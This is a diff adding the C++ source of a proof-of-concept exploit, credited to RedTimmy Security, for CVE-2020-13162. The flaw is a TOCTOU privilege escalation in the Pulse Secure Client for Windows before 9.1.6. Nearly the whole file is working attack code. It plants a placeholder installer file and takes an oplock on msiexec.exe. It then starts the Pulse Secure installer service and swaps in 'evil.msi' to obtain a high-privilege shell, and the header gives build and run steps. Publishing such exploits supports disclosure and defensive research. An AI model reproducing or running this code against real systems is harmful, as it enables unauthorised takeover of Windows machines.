@@ -1,0 +1,129 @@
+/* 
+tu-TOCTOU-kaiù-TOCMEU: in other words... Pulse Secure Client for Windows <9.1.6 TOCTOU Privilege Escalation (CVE-2020-13162)
+Compile as 32-bit binary if you don't want to die!
+Compiled with Visual Studio 2015 - Community Edition
+After compiling copy the generated binary into the same folder with "evil.msi" and the Pulse Secure released binary "PulseSecureInstallerService.exe"
+
+RedTimmy Security 2020 (c)
+ - Website: https://www.redtimmy.com
+ - Twitter: https://twitter.com/redtimmysec
+
+For more information about the bug read -> https://www.redtimmy.com/privilege-escalation/pulse-secure-client-for-windows-9-1-6-toctou-privilege-escalation-cve-2020-13162/
+
+[@] Hello cicci! If the exploit fails or just want to re-launch, delete the folder C:\ProgramData\Pulse Secure\Installers and all the files inside there, before to re-run it
+[*] Creating a new directory...
+[*] Creating our magic file...
+[*] Launching thread1...
+[*] Creating an exclusive oplock for msiexec.exe...
+[*] Oplock creation successful...
+[*] Running PulseSecureInstallerService...
+[*] Copy evil file to destination folder...
+Closing Handle
+[*] Oplock released...
+[!] If you are lucky, enjoy your high privileged shell!
+*/
+
+#include "stdafx.h"
+
+LPCWSTR PulseSecure_Installers = L"C:\\ProgramData\\Pulse Secure\\Installers";
+LPCWSTR PulseSecure_verifiedFile = L"C:\\ProgramData\\Pulse Secure\\Installers\\verified_PulseSecureInstallerService.msi";
+LPCWSTR MSIExec_OpLock = L"C:\\Windows\\system32\\msiexec.exe";
+LPCSTR PulseSecureInstallerService = "PulseSecureInstallerService.exe";
+LPCWSTR MaliciousFile = L"evil.msi";
+
+void OwnPulseSecureClient()
+{
+	// Copy evil.msi to verified pulsesecure path
+
+	printf("[*] Copy evil file to destination folder...\n");
+
+	if (!CopyFileW(MaliciousFile, PulseSecure_verifiedFile, FALSE))
+	{
+		printf("[-] Error with CopyFileW. The exploit will fail...\n");
+	}
+}
+
+DWORD WINAPI RunOplock(LPVOID lpdwThreadParam)
+{
+	static FileOpLock* oplock = nullptr;
+	UINT ret = 0;
+	
+	// Create an exclusive oplock for msiexec.exe
+	printf("[*] Creating an exclusive oplock for msiexec.exe...\n");
+
+	oplock = FileOpLock::CreateLock(MSIExec_OpLock, L"x", OwnPulseSecureClient);
+	if (oplock != nullptr)
+	{
+		printf("[*] Oplock creation successful...\n");
+	    printf("[*] Running PulseSecureInstallerService...\n");
+		
+		// Only safe Windows API call for RedTimmy followers. 
+		ret = WinExec(PulseSecureInstallerService, SW_SHOWNORMAL);
+		if (ret <= 31) // crazy stuff here
+		{
+			printf("[-] Failed to run PulseSecureInstallerService...\n");
+			return -1;
+		}
+
+		oplock->WaitForLock(INFINITE);
+		printf("[*] Oplock released...\n");
+		printf("[!] If you are lucky, enjoy your high privilege shell!\n");
+		delete oplock;
+	}
+	else
+	{
+		printf("[-] Error creating oplock\n");
+		return -1;
+	}
+}
+
+int _tmain()
+{
+	HANDLE thread1 = INVALID_HANDLE_VALUE;
+	HANDLE hVerifiedFile = INVALID_HANDLE_VALUE;
+	UINT ret = 0;
+	
+	printf("[@] Hello cicci! If the exploit fails or just want to re-launch, delete the folder %ls and all the files inside there, before to re-run it\n", PulseSecure_Installers);
+	// Create a new directory
+	printf("[*] Creating a new directory...\n");
+	if (!CreateDirectoryW(PulseSecure_Installers, NULL))
+	{
+		printf("[-] CreateDirectoryW error (%d)\n", GetLastError());
+		return -1;
+	}
+	
+	// Create the 'magic' file
+	printf("[*] Creating our magic file...\n");
+
+	hVerifiedFile = CreateFileW(PulseSecure_verifiedFile, // file name 
+		GENERIC_WRITE,                // open for write 
+		0,                            // do not share 
+		NULL,                         // default security 
+		CREATE_ALWAYS,                // overwrite existing
+		FILE_ATTRIBUTE_NORMAL,        // normal file 
+		NULL);                        // no template 
+
+	if (hVerifiedFile == INVALID_HANDLE_VALUE)
+	{
+		printf("[-] CreateFileW error (%d)\n", GetLastError());
+		return -1;
+	}
+
+	if (!CloseHandle(hVerifiedFile))
+	{
+		printf("[-] CloseHandle error (%d)\n", GetLastError());
+		return (-1);
+	}
+	
+	// Run thread creating the opportunist lock on msiexec.exe
+	printf("[*] Launching thread1...\n");
+	thread1 = CreateThread(NULL, 0, RunOplock, NULL, 0, NULL);
+	if (!thread1)
+	{
+		printf("[-] Error while launching the RunOpLock thread...\n");
+		return -1;
+	}
+
+	getc(stdin);
+
+}
